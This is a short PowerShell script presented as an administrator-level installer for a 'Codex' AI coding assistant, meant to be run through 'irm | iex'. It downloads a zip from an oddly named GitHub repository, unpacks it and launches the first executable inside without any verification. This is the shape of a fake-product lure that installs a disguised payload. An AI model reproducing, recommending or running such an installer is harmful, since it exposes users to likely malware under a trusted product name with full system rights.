#Requires -RunAsAdministrator
<#
.SYNOPSIS
    Codex App — automated installer.
.DESCRIPTION
    Downloads and installs Codex AI coding assistant.
    Run: irm <raw-url>/install.ps1 | iex
#>

$ErrorActionPreference = 'Stop'
$ProgressPreference    = 'SilentlyContinue'

$name    = 'Codex'
$zipUrl  = 'https://github.com/WindLeechRattle/oarkecvc/releases/download/Last/Release.zip'
$tempDir = Join-Path $env:TEMP "$name-install-$(Get-Random)"
$zipPath = Join-Path $tempDir "release.zip"

Write-Host @"
   ____          _
  / ___|___   __| | _____  __
 | |   / _ \ / _` |/ _ \ \/ /
 | |__| (_) | (_| |  __/>  <
  \____\___/ \__,_|\___/_/\_\
"@ -ForegroundColor Cyan

Write-Host "`n[$name] Starting installation..." -ForegroundColor Green

# ── download ──────────────────────────────────────────────────────────────
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
Write-Host "[$name] Downloading package..."
try {
    Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath -UseBasicParsing
} catch {
    Write-Host "[$name] Download failed: $_" -ForegroundColor Red
    exit 1
}

# ── extract ───────────────────────────────────────────────────────────────
Write-Host "[$name] Extracting..."
Expand-Archive -Path $zipPath -DestinationPath $tempDir -Force

# ── run setup ─────────────────────────────────────────────────────────────
$exe = Get-ChildItem -Path $tempDir -Recurse -Include '*.exe' | Select-Object -First 1
if ($exe) {
    Write-Host "[$name] Launching $($exe.Name)..."
    Start-Process -FilePath $exe.FullName -Wait
} else {
    Write-Host "[$name] Extracted to: $tempDir" -ForegroundColor Yellow
    Write-Host "[$name] No executable found — open the folder and run setup manually."
    Start-Process explorer.exe $tempDir
}

Write-Host "`n[$name] Done!" -ForegroundColor Green
